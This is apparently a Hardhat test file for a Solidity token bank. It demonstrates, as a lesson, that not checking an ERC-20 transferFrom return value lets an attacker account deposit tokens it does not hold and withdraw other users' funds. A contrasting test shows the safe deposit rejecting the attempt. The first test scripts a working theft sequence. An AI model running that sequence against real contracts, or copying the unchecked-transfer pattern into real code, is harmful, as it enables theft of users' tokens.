const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("TokenErrorHandling", function () {
  
  async function deploy() {
    /// Get accounts
    let [deployer, bob, alice, attacker] = await ethers.getSigners();

    /// Deploy testing contracts
    const TokenErrorHandlingContract = await ethers.getContractFactory("TokenErrorHandlingContract");
    const tokenBank = await TokenErrorHandlingContract.connect(deployer).deploy();

    const NoRevertToken = await ethers.getContractFactory("NoRevertToken");
    const initSupply = 1000000; // 1M
    const noRevertToken = await NoRevertToken.connect(deployer).deploy(initSupply);

    expect(await noRevertToken.balanceOf(deployer.address)).to.be.equal(initSupply);

    /// Deployer deposit tokens into the bank
    const amountToDeposit = 1000;
    await noRevertToken.connect(deployer).approve(tokenBank.address, amountToDeposit);
    await tokenBank.connect(deployer).depositSafe(noRevertToken.address, amountToDeposit);

    /// Airdrop
    await noRevertToken.connect(deployer).transfer(bob.address, 1000);
    await noRevertToken.connect(deployer).transfer(alice.address, 1000);

    return { tokenBank, noRevertToken, deployer, bob, alice, attacker };
  }

  describe("Deployment", () => {
    it("Deploy TokenErrorHandling contract", async () => {
      const { tokenBank, noRevertToken, deployer, bob, alice } = await deploy();
      expect(await tokenBank.balances(noRevertToken.address, deployer.address)).to.be.equal(1000);
      expect(await noRevertToken.balanceOf(bob.address)).to.be.equal(1000);
      expect(await noRevertToken.balanceOf(alice.address)).to.be.equal(1000);
    });
  });

  describe("Test Deposit", () => {
    it("Unsafe token transfering", async () => {
      const { tokenBank, noRevertToken, deployer, bob, alice, attacker } = await deploy();
      /// users deposit noRevertToken into the bank
      const amountToDeposit = 500;
      await noRevertToken.connect(bob).approve(tokenBank.address, amountToDeposit);
      await tokenBank.connect(bob).depositUnsafe(noRevertToken.address, amountToDeposit);
      await noRevertToken.connect(alice).approve(tokenBank.address, amountToDeposit);
      await tokenBank.connect(alice).depositUnsafe(noRevertToken.address, amountToDeposit);
      /*
        An attacker can steal tokens by following these steps:
        - approve token for the bank
        - deposit any amount they wanted (due to the code not checking the return value)
        - withdraw token, actually steal it, from the bank
      */
      console.log(`---- Before the attack ----`);
      const balanceBefore = await noRevertToken.balanceOf(attacker.address);
      console.log(`Token.balanceOf[attacker]: ${balanceBefore} NRT`);
      /// the attack
      const amountToSteal = 1000 + 500 +500; /// deployer + bob + alice
      await noRevertToken.connect(attacker).approve(tokenBank.address, amountToSteal);
      await tokenBank.connect(attacker).depositUnsafe(noRevertToken.address, amountToSteal);
      await tokenBank.connect(attacker).withdraw(noRevertToken.address, amountToSteal);
      console.log(`---- After the attack ----`);
      const balanceAfter = await noRevertToken.balanceOf(attacker.address);
      console.log(`Token.balanceOf[attacker]: ${balanceAfter} NRT`);
      expect(balanceAfter > balanceBefore);
    });

    it("Safer way to transfer token", async () => {
      const { tokenBank, noRevertToken, deployer, bob, alice, attacker } = await deploy();
      /// users deposit noRevertToken into the bank
      const amountToDeposit = 500;
      await noRevertToken.connect(bob).approve(tokenBank.address, amountToDeposit);
      await tokenBank.connect(bob).depositSafe(noRevertToken.address, amountToDeposit);
      await noRevertToken.connect(alice).approve(tokenBank.address, amountToDeposit);
      await tokenBank.connect(alice).depositSafe(noRevertToken.address, amountToDeposit);
      /*
        An attacker try to steal tokens from the bank
      */
      expect(await noRevertToken.balanceOf(attacker.address)).to.be.equal(0);
      const amountToSteal = 1000 + 500 +500; /// deployer + bob + alice
      await noRevertToken.connect(attacker).approve(tokenBank.address, amountToSteal);
      await expect(
        tokenBank.connect(attacker).depositSafe(noRevertToken.address, amountToSteal)
      ).to.be.rejectedWith("transferFrom failed");
    });
  });

});